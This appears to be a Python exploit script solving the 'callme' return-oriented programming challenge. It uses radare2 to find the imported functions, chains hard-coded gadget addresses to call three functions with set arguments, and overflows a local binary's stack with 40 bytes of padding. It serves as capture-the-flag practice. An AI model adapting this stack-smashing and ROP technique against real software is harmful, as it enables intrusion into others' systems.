import r2pipe
from pwn import *

binary = './callme'

def hex2int(s):
    return int(s[2:], 16)

r2 = r2pipe.open(binary)
r2.cmd('aaaa')

# put content here (define payload)
payload = b''

cont = r2.cmd('f~sym.imp.callme')
addrs = {}
for x in cont.strip().splitlines():
    addrs[x.split()[2].split('.')[2]] = hex2int(x.split()[0])
print(addrs)

def pop_rdi(rdi):
    return p64(0x0000000000401b23) + p64(rdi)

def pop_rsi_rdx(rsi, rdx):
    return p64(0x0000000000401ab1) + p64(rsi) + p64(rdx)

payload += pop_rdi(1)
payload += pop_rsi_rdx(2, 3)
payload += p64(addrs['callme_one'])

payload += pop_rdi(1)
payload += pop_rsi_rdx(2, 3)
payload += p64(addrs['callme_two'])

payload += pop_rdi(1)
payload += pop_rsi_rdx(2, 3)
payload += p64(addrs['callme_three'])

# end of content

p = process(binary)
p.sendline(b'a' * 40 + payload)
p.wait()
print(p.recvall().decode())
